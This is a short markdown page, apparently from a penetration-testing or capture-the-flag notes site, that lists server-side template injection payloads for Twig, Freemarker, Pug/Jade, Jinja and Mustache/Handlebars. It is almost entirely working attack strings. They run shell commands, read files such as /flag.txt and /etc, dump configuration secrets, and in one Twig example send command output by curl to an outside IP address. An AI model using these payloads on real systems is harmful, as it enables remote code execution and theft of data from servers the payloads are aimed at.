---
title: Useful Payloads
layout: default
parent: SSTI
has_children: false
nav_order: 1
---

<h2>Twig:</h2>
{% raw %}
    {{[0]|reduce('system','whoami')}}
    {{['id']|filter('system')}}
    {{[0]|reduce('passthru','ls')}}
    {{[0]|reduce('exec','ls')}}
    {{[0]|reduce('shell_exec','ls')}}
{% endraw %}

<h2>Twig (blind/exfil only):</h2>
{% raw %}
    {% set output %}
    {{[0]|reduce('system','cat /flag.txt')}}
    {% endset %}
    {% set exfil = output| url_encode %}
    {{[0]|reduce('system','curl http://192.168.45.214/?exfil=' ~ exfil)}}
{% endraw %}

<h2>Freemarker:</h2>
{% raw %}
    ${"freemarker.template.utility.Execute"?new()("whoami")}
{% endraw %}

<h2>Pug/Jade:</h2>
{% raw %}
    - var require = global.process.mainModule.require
    = require('child_process').spawnSync('ls',['-la','/tmp']).stdout
{% endraw %}

<h2>Jinja (NOT RCE, just config secrets):</h2>
{% raw %}
    {{config|pprint}}
{% endraw %}

<h2>Mustache and Handlebars (NOT RCE, just file read. First 3 lines is to read directory, subsequently read file):</h2>
{% raw %}
    {{#each (readdir "/etc")}}
        {{this}}
    {{/each}}

    {{read "/secret/flag.txt"}}
{% endraw %}